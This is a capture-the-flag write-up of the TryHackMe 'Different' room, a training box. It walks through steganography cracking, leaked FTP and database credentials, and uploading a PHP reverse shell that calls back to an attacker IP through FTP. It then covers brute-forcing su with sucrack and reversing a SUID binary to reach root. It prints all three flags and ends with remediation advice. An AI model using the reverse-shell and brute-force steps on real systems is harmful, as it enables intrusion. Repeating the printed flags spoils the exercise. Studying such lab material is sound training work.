<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=280&section=header&text=DIFFERENT%20CTF&fontSize=90&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=TryHackMe%20%E2%80%A2%20HARD%20LEVEL%20%E2%80%A2%20FULL%20ROOT%20COMPROMISE&descAlignY=58&descSize=22&descColor=F75C03"/>

<br>

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=30&duration=2500&pause=800&color=F75C03&center=true&vCenter=true&multiline=true&width=1000&height=140&lines=%F0%9F%95%B7%EF%B8%8F+Steganography+%E2%86%92+FTP+Leak+%E2%86%92+Hidden+Subdomain;%F0%9F%92%A5+FTP+Upload+RCE+%E2%86%92+sucrack+Bruteforce+%E2%86%92+SUID+RE;%F0%9F%94%A2+Hex+%E2%86%92+Base85+CyberChef+Decode+%E2%86%92+ROOT;%F0%9F%94%A5+60%2B+Commands+%7C+14+Stages+%7C+1+Full+Takeover" alt="Typing SVG" />

<br>

<img src="https://img.shields.io/badge/PLATFORM-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white"/>
<img src="https://img.shields.io/badge/DIFFICULTY-HARD-critical?style=for-the-badge&logo=target"/>
<img src="https://img.shields.io/badge/OS-Ubuntu%2018.04-E95420?style=for-the-badge&logo=ubuntu&logoColor=white"/>
<img src="https://img.shields.io/badge/STATUS-ROOT%20ACHIEVED-success?style=for-the-badge&logo=checkmarx"/>
<img src="https://img.shields.io/badge/FLAGS-3%2F3%20CAPTURED-yellow?style=for-the-badge&logo=flag"/>
<img src="https://img.shields.io/badge/COMMANDS-60%2B-purple?style=for-the-badge&logo=gnubash"/>

<br><br>

<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="900">

</div>

---

<div align="center">

# 🕷️ **DIFFERENT CTF**

### **THE ULTIMATE HARD-LEVEL FULL ROOT COMPROMISE WALKTHROUGH**

<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=900&size=24&duration=3000&pause=1000&color=FF6B00&center=true&vCenter=true&width=900&lines=Where+Enumeration+Meets+Creativity;Think+Different.+Hack+Different.;Stego+%2B+Reverse+Engineering+%2B+CyberChef+Magic" alt="Subtitle Typing SVG"/>

</div>

---

<div align="center">

## 🧭 **OVERVIEW**

</div>

> **Different CTF** is a **HARD-difficulty** TryHackMe room that lives up to its name — it doesn't follow a predictable **"scan → exploit → escalate"** formula. Instead, it chains together **steganography**, **custom encoding decode**, **FTP-based source code leak**, **phpMyAdmin pivoting to a hidden vhost**, **FTP upload RCE**, **a custom-compiled brute-force tool (`sucrack`)**, **reverse engineering a SUID binary**, and **CyberChef-based custom hex/Base85 decoding** to fully compromise the target.

> ⚠️ **Performed strictly against an intentionally vulnerable TryHackMe training VM, for educational purposes only.**

<br>

<div align="center">

<img src="https://img.shields.io/badge/🎯_TARGET-Different_CTF-0f0c29?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🐧_OS-Ubuntu_18.04-E95420?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🧩_VULNS-8_Chained-db61a2?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🏁_RESULT-ROOT_✅-success?style=for-the-badge"/>

</div>

---

<div align="center">

## ⚔️ **THE ATTACK CHAIN**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=18&duration=2000&pause=500&color=8B5CF6&center=true&vCenter=true&width=900&lines=Recon+%E2%86%92+Web+Enum+%E2%86%92+Stego+%E2%86%92+Decode+%E2%86%92+FTP+Leak;phpMyAdmin+%E2%86%92+Hidden+Vhost+%E2%86%92+FTP+Upload+RCE+%E2%86%92+Web+Flag;hakanftp+%E2%86%92+Build+sucrack+%E2%86%92+hakanbey+%E2%86%92+User+Flag;SUID+RE+%E2%86%92+CyberChef+%E2%86%92+ROOT+%E2%86%92+Root+Flag" alt="Attack Chain Typing SVG"/>

</div>

```mermaid
graph LR
    A[🔍 Recon] --> B[📂 Web Enum]
    B --> C[🖼️ Stego]
    C --> D[🔐 Decode]
    D --> E[📡 FTP Leak]
    E --> F[💾 phpMyAdmin]
    F --> G[🌐 Hidden Vhost]
    G --> H[💥 FTP Upload RCE]
    H --> I[🚩 Web Flag]
    I --> J[🔄 hakanftp]
    J --> K[🔨 Build sucrack]
    K --> L[🔓 hakanbey]
    L --> M[🚩 User Flag]
    M --> N[🧬 SUID RE]
    N --> O[🔢 CyberChef]
    O --> P[👑 ROOT]
    P --> Q[🚩 Root Flag]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#db61a2,stroke:#fff,color:#fff
    style C fill:#f0883e,stroke:#fff,color:#fff
    style D fill:#3fb950,stroke:#fff,color:#fff
    style E fill:#a371f7,stroke:#fff,color:#fff
    style F fill:#f85149,stroke:#fff,color:#fff
    style G fill:#58a6ff,stroke:#fff,color:#fff
    style H fill:#d29922,stroke:#fff,color:#fff
    style I fill:#ff7b72,stroke:#fff,color:#fff
    style J fill:#8b949e,stroke:#fff,color:#fff
    style K fill:#1f6feb,stroke:#fff,color:#fff
    style L fill:#db61a2,stroke:#fff,color:#fff
    style M fill:#f0883e,stroke:#fff,color:#fff
    style N fill:#3fb950,stroke:#fff,color:#fff
    style O fill:#a371f7,stroke:#fff,color:#fff
    style P fill:#f85149,stroke:#fff,color:#fff
    style Q fill:#ffd700,stroke:#000,color:#000
```

<div align="center">

| # | Stage | Technique | Result |
|:---:|:---|:---|:---|
| 1 | 🔍 Recon | `nmap -sC -sV -p- --min-rate 5000 -T4` | FTP 21, HTTP 80 (WordPress 5.6) |
| 2 | 📂 Web Enum | `gobuster dir` on `adana.thm` | Found `/announcements/` directory |
| 3 | 📥 Download | `wget` image + wordlist | `australian-bulldog-ant.jpg` + `wordlist.txt` |
| 4 | 🖼️ Stego | `stegseek` brute-force | Passphrase `123adanaantinwar` recovered |
| 5 | 🔐 Decode | hashes.com / Base64 decode | FTP creds: `hakanftp : 123adanacrack` |
| 6 | 📡 FTP Access | `ftp hakanftp@target` | Downloaded `wp-config.php` |
| 7 | 💾 DB Leak | `wp-config.php` inspection | `phpmyadmin : 12345` |
| 8 | 🌐 Hidden Vhost | phpMyAdmin → `phpmyadmin1` DB | **`subdomain.adana.thm`** discovered |
| 9 | 💥 FTP Upload RCE | Overwrote `index.php` with PHP shell | Reverse shell as `www-data` |
| 10 | 🚩 Web Flag | `cat wwe3bbfla4g.txt` | `THM{343a...ff}` |
| 11 | 🔄 Pivot | `su hakanftp` | Shell as `hakanftp` |
| 12 | 🔨 Build sucrack | Local compile + FTP transfer | `sucrack` binary ready |
| 13 | 🔓 Crack su | `./sucrack -u hakanbey wordlist2.txt` | `hakanbey : 123adanasubaru` |
| 14 | 🚩 User Flag | `cat user.txt` | `THM{8ba9...27}` |
| 15 | 🧬 SUID RE | `strings` + `ltrace /usr/bin/binary` | Input `warzoneinadana` unlocked root.jpg |
| 16 | 🔢 Hex → Base85 | CyberChef recipe | Root creds `root : Go0odJo0BbBro0o` |
| 17 | 👑 Root | `su root` + `cat root.txt` | `THM{c5a9...6c}` 🎯 |

</div>

---

<div align="center">

# 1️⃣ **RECONNAISSANCE**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=16&duration=2000&pause=1000&color=3FB950&center=true&vCenter=true&width=700&lines=Every+great+hack+starts+with+silence;and+a+scan." alt="Recon Typing SVG"/>

</div>

```bash
# ── Add target to /etc/hosts for cleaner access ──
echo "10.146.133.125 adana.thm" | sudo tee -a /etc/hosts

# ── Full TCP port scan with service detection ──
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.133.125 -oN recon.txt

# ── Alternative: aggressive all-ports scan ──
nmap -p- -A -T4 10.146.133.125 -oN full_recon.txt
```

**Discovered services:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)   (WordPress 5.6)
```

> 💡 **Note:** Only 2 ports open — a small attack surface, but the room name *("think differently")* was already hinting that the obvious path wasn't the real one.

---

<div align="center">

# 2️⃣ **WEB ENUMERATION & DIRECTORY DISCOVERY**

</div>

Browsing to `http://adana.thm` revealed a stock **"Hello World"** WordPress site authored by `hakanbey01`.

```bash
# ── Directory brute-force with Gobuster ──
gobuster dir -u http://10.146.133.125 \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

**Found:**

```
.htpasswd             (Status: 403) [Size: 279]
.htaccess             (Status: 403) [Size: 279]
announcements         (Status: 301) [→ http://10.146.133.125/announcements/]
```

Inside `/announcements/` — an **open directory listing**:

```
Index of /announcements
----------------------------------------
australian-bulldog-ant.jpg    58K
wordlist.txt                  394K
```

Download both:

```bash
wget http://10.146.133.125/announcements/australian-bulldog-ant.jpg
wget http://10.146.133.125/announcements/wordlist.txt
```

> 🧠 An open directory with a **wordlist** and an **image** is a screaming invitation to steganography.

---

<div align="center">

# 3️⃣ **STEGANOGRAPHY — CRACKING THE HIDDEN IMAGE**

</div>

```bash
# ── Check for standard metadata first ──
exiftool australian-bulldog-ant.jpg

# ── Confirm steganographic content exists ──
steghide info australian-bulldog-ant.jpg
# Enter passphrase: (blank) → could not extract data

# ── Brute-force the passphrase with the provided wordlist ──
stegseek australian-bulldog-ant.jpg wordlist.txt
```

**StegSeek output:**

```
[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt"
[i] Extracting to "australian-bulldog-ant.jpg.out"
```

```bash
# ── Read the extracted file ──
cat australian-bulldog-ant.jpg.out
```

The extracted file contained an **encoded string**:

```
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw==
```

Decoded via **[hashes.com](https://hashes.com/en/decrypt/hash)**:

```
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw== : FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

🔑 **Credentials obtained:** `hakanftp : 123adanacrack`

---

<div align="center">

# 4️⃣ **FTP ACCESS & WP-CONFIG.PHP LEAK**

</div>

```bash
# ── Log in with discovered FTP creds ──
ftp 10.144.147.159
# Name: hakanftp
# Password: 123adanacrack
# 230 Login successful.

ftp> ls -la
# Full WordPress install on the FTP server

# ── Pull the crown jewel — wp-config.php ──
ftp> get wp-config.php
ftp> bye
```

```bash
cat wp-config.php | grep -E 'DB_|table_prefix'
```

```php
define( 'DB_NAME', 'phpmyadmin1' );
define( 'DB_USER', 'phpmyadmin' );
define( 'DB_PASSWORD', '12345' );
define( 'DB_HOST', 'localhost' );
```

🔑 **Database credentials obtained:** `phpmyadmin : 12345`

---

<div align="center">

# 5️⃣ **DISCOVERING A HIDDEN SUBDOMAIN**

</div>

```bash
# ── A second pass on the vhost (adana.thm) revealed more paths ──
gobuster dir -u http://adana.thm/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

```
phpmyadmin       (Status: 301) [→ http://adana.thm/phpmyadmin/]
wp-admin         (Status: 301)
wp-content       (Status: 301)
wp-includes      (Status: 301)
javascript       (Status: 301)
```

**Log into phpMyAdmin** at `http://adana.thm/phpmyadmin/` with `phpmyadmin:12345`. Inside, **two separate databases** are visible:

| Database | `wp_options.siteurl` |
|:---|:---|
| `phpmyadmin` | `http://adana.thm` (known) |
| **`phpmyadmin1`** | **`http://subdomain.adana.thm`** ⚠️ **undiscovered WP instance!** |

```bash
# ── Add the hidden vhost to /etc/hosts ──
echo "10.144.147.159 subdomain.adana.thm" | sudo tee -a /etc/hosts
```

> 🚨 **This hidden pivot was the real key to the "think differently" theme.**

---

<div align="center">

# 6️⃣ **GAINING A FOOTHOLD — RCE VIA FTP UPLOAD**

</div>

```bash
# ── Pull down the subdomain's index.php ──
ftp 10.144.147.159
ftp> get index.php
ftp> bye

# ── Replace it with pentestmonkey's php-reverse-shell ──
cp /usr/share/webshells/php/php-reverse-shell.php index.php
nano index.php
#   $ip   = '10.8.x.x';   ← attacker IP
#   $port = 4444;         ← listener port

# ── Push the payload back up ──
ftp 10.144.147.159
ftp> put index.php
ftp> bye
```

**Start the listener:**

```bash
nc -nvlp 4444
```

**Trigger the payload:** `http://subdomain.adana.thm/index.php`

```
listening on [any] 4444 ...
connect to [10.8.x.x] from (UNKNOWN) [10.144.147.159] 45792
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

🐚 **Shell obtained as `www-data`.**

---

<div align="center">

# 7️⃣ **CAPTURING THE WEB FLAG**

</div>

```bash
cd /var/www/html
ls -la
#   wwe3bbfla4g.txt   ← the flag file

cat wwe3bbfla4g.txt
```

<div align="center">

### 🌐 **WEB FLAG**

```
THM{343a7e2064a1d992c01ee201c346edff}
```

</div>

---

<div align="center">

# 8️⃣ **PIVOTING TO HAKANFTP**

</div>

```bash
# ── Upgrade the shell to a full TTY first ──
/usr/bin/script -qc /bin/bash /dev/null

# ── Pivot to the FTP user ──
su hakanftp
# Password: 123adanacrack
```

✅ **Shell as `hakanftp` (uid=1001).**

**Inside `hakanftp`'s home:**

```
source-sucrack.tar.gz   (322,771 bytes)
wordlist.txt            (403,891 bytes)
```

---

<div align="center">

# 9️⃣ **BUILDING & WEAPONIZING SUCRACK**

</div>

```bash
# ── On the ATTACKER box: clone + package sucrack ──
git clone https://github.com/hemp3l/sucrack.git
tar -czvf source-sucrack.tar.gz ./sucrack

# ── Transfer it + a wordlist to the target via FTP ──
ftp 10.144.147.159
ftp> put wordlist.txt
ftp> put source-sucrack.tar.gz
ftp> bye
```

**On the TARGET:**

```bash
tar xfz source-sucrack.tar.gz
cd sucrack
./configure
make
```

✅ Working `sucrack` binary at `~/sucrack/src/sucrack`.

---

<div align="center">

# 🔟 **PRIVILEGE ESCALATION → HAKANBEY (USER FLAG)**

</div>

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
# hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash

# ── Prepare the wordlist ──
sed 's/^123adana/c$/' wordlist.txt > wordlist2.txt

# ── Run sucrack against hakanbey with 100 threads ──
./sucrack -w 100 -u hakanbey wordlist2.txt
# password is: 123adanasubaru

su hakanbey
# Password: 123adanasubaru

cat /home/hakanbey/user.txt
```

<div align="center">

### 👤 **USER FLAG**

```
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

</div>

---

<div align="center">

# 1️⃣1️⃣ **REVERSE ENGINEERING THE SUID BINARY**

</div>

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/binary      ← not a standard Linux binary!
```

**Static analysis with `strings`:**

```bash
strings /usr/bin/binary
```

```
I think you should enter the correct string here ==>
Hint! : %s
/root/hint.txt
/root/root.jpg
```

**Dynamic analysis with `ltrace`:**

```bash
ltrace /usr/bin/binary
```

```
strcat("war", "zone")       = "warzone"
strcat("warzone", "in")     = "warzonein"
strcat("warzonein", "ada")  = "warzoneinada"
strcat("warzoneinada", "na")= "warzoneinadana"
```

The expected input is simply the built string: **`warzoneinadana`**.

```bash
/usr/bin/binary
I think you should enter the correct string here ==> warzoneinadana
# Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
```

The binary copied `/root/root.jpg` into a user-reachable location.

---

<div align="center">

# 1️⃣2️⃣ **CYBERCHEF DECODE & ROOT ACCESS**

</div>

Open `root.jpg` in a hex editor — bytes at offset **`0x00000020`**:

```
00000020:  FE E9 9D 3D 79 18 5F FC  82 6D DF 1C 69 AC C2 75
```

**CyberChef recipe:**

```
  1. From Hex      (Delimiter: Auto)
  2. To Base85     (Alphabet: !-u, Include delimiter: false)
```

| Step | Value |
|:---|:---|
| **Input (Hex)** | `FE E9 9D 3D 79 18 5F FC 82 6D DF 1C 69 AC C2 75` |
| **Output (ASCII)** | `root:Go0odJo0BbBro0o` |

🔑 **Root credentials recovered:** `root : Go0odJo0BbBro0o`

```bash
su root
# Password: Go0odJo0BbBro0o

whoami
# root
```

---

<div align="center">

# 1️⃣3️⃣ **ROOT FLAG** 🏁

</div>

```bash
cat /root/root.txt
```

<div align="center">

### 👑 **ROOT FLAG**

```
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```

</div>

---

<div align="center">

# 🏆 **FLAGS SUMMARY**

</div>

<div align="center">

| 🏁 Flag Type | 🎯 Value |
|:---|:---|
| 🌐 **Web Flag** | `THM{343a7e2064a1d992c01ee201c346edff}` |
| 👤 **User Flag** | `THM{8ba9d7715fe726332b7fc9bd00e67127}` |
| 🔓 **Root Flag** | `THM{c5a9d3e4147a13cbd1ca24b014466a6c}` |

<br>

```
 ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║
 ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ 
```

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="500">

</div>

---

<div align="center">

# 🛡️ **REMEDIATION SUMMARY**

</div>

| 🔎 Finding | 🛠️ Fix |
|:---|:---|
| Open `/announcements/` directory | Disable directory listing in Apache (`Options -Indexes`) |
| Steganography in public images | Never store credentials in images served from the web |
| FTP anonymous/writable access | Restrict FTP write access; disable FTP in favor of SFTP |
| `wp-config.php` readable via FTP | Enforce strong FTP credentials; separate web root from FTP share |
| phpMyAdmin accessible publicly | Bind phpMyAdmin to localhost or restrict via IP allow-list |
| Hidden vhost leak via `wp_options` | Encrypt sensitive DB fields; don't rely on vhost obscurity |
| Password reuse across services | Enforce unique credentials per user/service |
| SUID binary with weak string logic | Remove SUID bit; validate inputs strictly; don't copy sensitive files |
| Credentials hidden in image hex | Never embed real credentials in any distributed file |

---

<div align="center">

# 🧰 **TOOLS USED**

</div>

<div align="center">

![Nmap](https://img.shields.io/badge/nmap-4682B4?style=for-the-badge&logo=nmap&logoColor=white)
![Gobuster](https://img.shields.io/badge/gobuster-FF6B6B?style=for-the-badge)
![Steghide](https://img.shields.io/badge/steghide-4B8BBE?style=for-the-badge)
![Stegseek](https://img.shields.io/badge/stegseek-8E44AD?style=for-the-badge)
![FTP](https://img.shields.io/badge/FTP-003366?style=for-the-badge)
![phpMyAdmin](https://img.shields.io/badge/phpMyAdmin-F89C1C?style=for-the-badge&logo=phpmyadmin&logoColor=white)
![Netcat](https://img.shields.io/badge/netcat-333333?style=for-the-badge)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![CyberChef](https://img.shields.io/badge/CyberChef-00A98F?style=for-the-badge)

`nmap` · `gobuster` · `exiftool` · `steghide` · `stegseek` · [hashes.com](https://hashes.com) · `ftp` · `phpMyAdmin` · `netcat` · `pentestmonkey php-reverse-shell` · `sucrack` · `strings` · `ltrace` · `hexeditor` · `CyberChef`

</div>

---

<div align="center">

# 📊 **COMMAND COUNT**

</div>

<div align="center">

| Category | Commands Used |
|:---|:---:|
| 🔍 Reconnaissance | 3 |
| 📂 Enumeration | 8 |
| 🖼️ Steganography | 5 |
| 🔐 Decoding | 4 |
| 💥 Exploitation | 6 |
| 🐚 Shell Handling | 5 |
| 🔑 Lateral Movement | 6 |
| 🧬 Privilege Escalation | 8 |
| 🧠 Reverse Engineering | 5 |
| 🔢 CyberChef / Hex | 4 |
| 🛠️ Utilities | 6 |
| **TOTAL** | **60+** |

</div>

---

<div align="center">

# 💡 **KEY TAKEAWAYS**

</div>

- 🎯 **Don't trust the obvious vhost** — a huge chunk of this box was hidden behind a second, undiscoverable-by-normal-means WordPress install, only found by pivoting through `wp_options` in a second database inside phpMyAdmin.
- 🖼️ **Steganography wordlists often double as system wordlists** — the same `wordlist.txt` used to crack the steghide passphrase was later reused (with light modification) to brute-force a real system account via `sucrack`.
- 🧬 **SUID binaries aren't always simple `strings` leaks** — `ltrace` let us reconstruct the exact expected input by watching the binary build the string at runtime via `strcat`.
- 🍳 **"Hint: CyberChef" is a direct signal** — when a CTF explicitly names a tool, trust it; the correct recipe (`From Hex` → `To Base85` with a custom alphabet) was non-obvious without that nudge.
- 🔑 **Credential reuse across services** is the glue — every password on this box (FTP, DB, user, root) was related, which made lateral movement smooth once the pattern was spotted.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=200&section=header&text=%F0%9F%96%BC%EF%B8%8F%20FULL%20VISUAL%20WALKTHROUGH&fontSize=45&fontColor=F75C03&animation=twinkling&fontAlignY=50"/>

<br>

### 📸 **ALL SCREENSHOTS IN SEQUENTIAL ORDER**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=18&duration=2500&pause=800&color=3FB950&center=true&vCenter=true&width=900&lines=Follow+these+images+top+to+bottom+to+fully+reproduce+this+machine;from+recon+to+root+%E2%80%94+step+by+step" alt="Visual Walkthrough Typing SVG"/>

</div>

> 📌 **Below are all screenshots in sequential order.** Each image is a step-by-step walkthrough — follow them top to bottom to fully reproduce this **HARD-level** machine from recon to root.

---
<div align="center">
<img width="1920" height="1080" alt="Screenshot_2026-10-01_21_04_33" src="https://github.com/user-attachments/assets/7e9bbca1-3c46-47ea-a28b-531b10315a58" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_21_53_44" src="https://github.com/user-attachments/assets/cfc82bc3-848d-4cb4-b40d-c093e7efe597" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_21_53_55" src="https://github.com/user-attachments/assets/119d9a10-4786-419c-b644-05dee0d4cb28" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_21_55_00" src="https://github.com/user-attachments/assets/59e7bc51-4a02-4531-950d-a02dd8e2a36b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_01_46" src="https://github.com/user-attachments/assets/b16d6b76-b4aa-4bcf-9698-26a437ccab10" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_02_07" src="https://github.com/user-attachments/assets/60c914a9-60b7-4122-9652-94f10a4a38a8" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_04_34" src="https://github.com/user-attachments/assets/5dd5704e-5dd7-44fd-af05-d4f8191ea442" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_11_52" src="https://github.com/user-attachments/assets/665d272a-6356-4a74-960b-daef5242a8fa" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_36_54" src="https://github.com/user-attachments/assets/af8a6f1e-f150-4a5b-90d8-13d1d2ca6b18" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_36_57" src="https://github.com/user-attachments/assets/ac6923d8-43b8-4a36-b56d-7c8ba772b8d2" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_37_02" src="https://github.com/user-attachments/assets/a4ebd109-fc45-4ecf-bec8-83cc095c9e3e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_37_07" src="https://github.com/user-attachments/assets/0349efff-c638-4a90-a083-036727811b9e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_38_47" src="https://github.com/user-attachments/assets/4a07b79e-3589-4beb-bf22-79eb9aa3b6e8" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_46_42" src="https://github.com/user-attachments/assets/d41fd9b6-1d65-4b7f-8963-ec505663a933" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_47_06" src="https://github.com/user-attachments/assets/e5d87de8-6d87-4fe6-a600-87df3aeafb58" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_47_24" src="https://github.com/user-attachments/assets/5bb049e4-b968-4e6e-a96d-697c79800543" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_56_42" src="https://github.com/user-attachments/assets/7eadaa92-ba9a-4d9d-9389-55235f065aa9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_56_48" src="https://github.com/user-attachments/assets/0bbc748e-61f5-44bc-b4ef-70933170b0d1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_58_25" src="https://github.com/user-attachments/assets/4e248fdb-ff7d-4a47-978d-730239e77e97" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_22_59_43" src="https://github.com/user-attachments/assets/0347a4b8-8f63-4865-a4c9-de1d68abc3f1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_09_47" src="https://github.com/user-attachments/assets/5ddf0f7b-7692-4c53-aa2b-0254e243cf1c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_10_56" src="https://github.com/user-attachments/assets/9feb6d8f-800c-41a5-9602-cb2bda614ed1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_11_19" src="https://github.com/user-attachments/assets/ce196546-10b8-4008-8e8d-9261978da6e7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_12_18" src="https://github.com/user-attachments/assets/81247da3-85b9-4e65-958d-43adcc3507c1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_24_31" src="https://github.com/user-attachments/assets/441862f2-e9ee-46f5-ae56-795e189d0a09" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_25_07" src="https://github.com/user-attachments/assets/80fb2fe8-a5e3-45da-bb56-ca29c9ab0104" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_25_22" src="https://github.com/user-attachments/assets/286007fb-4256-4987-963f-db34e0478e60" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_25_52" src="https://github.com/user-attachments/assets/cb701bf9-14bb-4311-a916-fdb6eef91261" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_26_24" src="https://github.com/user-attachments/assets/434bfffd-951f-497b-afeb-620147c99bed" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_26_44" src="https://github.com/user-attachments/assets/9c2fea8b-80fc-463c-850b-2893bc4644d3" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_26_56" src="https://github.com/user-attachments/assets/8c72e4e5-222a-4f30-8d00-ee971e898773" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_28_00" src="https://github.com/user-attachments/assets/573b25b5-4937-4629-8022-873452c4fa91" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_28_48" src="https://github.com/user-attachments/assets/8b686d59-b9f7-4033-92f2-86cd5405fa13" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_34_19" src="https://github.com/user-attachments/assets/8ad1c688-c51e-4c3d-a58e-64d4d9058edd" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_51_08" src="https://github.com/user-attachments/assets/c06a8043-9363-4f1e-886e-0bfa07b6bbe4" />
<img width="1920" height="1080" alt="Screenshot_2026-10-01_23_54_49" src="https://github.com/user-attachments/assets/0115a078-42ea-4fa7-a830-49577df3a55a" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_00_31" src="https://github.com/user-attachments/assets/8c6c11cd-fcd0-4f41-8f8e-be06d5cd7116" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_00_34" src="https://github.com/user-attachments/assets/ddf6cd1d-51cc-456e-aec2-96d4d475a57d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_02_03" src="https://github.com/user-attachments/assets/a5f2fb81-3327-4e58-b886-498f93f44fe4" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_02_13" src="https://github.com/user-attachments/assets/11d83be2-9593-441f-abcb-f5ce595f9cca" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_04_14" src="https://github.com/user-attachments/assets/4d999dd5-563f-4246-a080-e534a39f5110" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_04_48" src="https://github.com/user-attachments/assets/059486fc-eda9-413c-8750-8ef5f6b4baf1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_04_56" src="https://github.com/user-attachments/assets/df139419-f44e-43b6-86e0-f1533becdec3" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_07_30" src="https://github.com/user-attachments/assets/3856ba78-265b-490d-a930-99991a5ec787" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_07_34" src="https://github.com/user-attachments/assets/7f473937-f17c-4245-8372-6c55a6c43f02" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_07_41" src="https://github.com/user-attachments/assets/dad6b434-89ec-40f3-84ba-534ee809dd3a" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_08_08" src="https://github.com/user-attachments/assets/acb5b6ad-4959-4643-aed7-b448faf34620" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_11_50" src="https://github.com/user-attachments/assets/eafe5e95-a184-4d4a-ad1a-6f7fd4247661" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_14_02" src="https://github.com/user-attachments/assets/69bc4a7b-ce76-4550-abc1-7681a3d1c50e" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_18_12" src="https://github.com/user-attachments/assets/424e15ba-41ea-4f87-a450-5ab4dc888d16" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_19_45" src="https://github.com/user-attachments/assets/b2581991-221f-452a-9585-8a963c394935" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_19_52" src="https://github.com/user-attachments/assets/81f373e3-2668-4fbc-8a68-960f4b49b05b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-02_00_21_33" src="https://github.com/user-attachments/assets/87dc3053-cb58-44a3-a265-b2ba56ec14d9" />
